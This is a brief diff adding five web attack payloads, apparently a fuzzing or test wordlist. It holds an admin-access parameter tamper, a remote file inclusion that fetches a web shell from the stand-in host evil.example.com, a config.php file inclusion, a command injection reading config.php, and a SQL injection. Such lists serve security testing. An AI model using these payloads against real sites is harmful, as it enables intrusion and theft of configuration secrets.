@@ -1,0 +1,5 @@
+3/index.php?access=admin
+4/index.php?page=http://evil.example.com/webshell.txt?
+5/index.php?file=config.php
+6/ ; cat config.php
+7/ a' or 1=1--
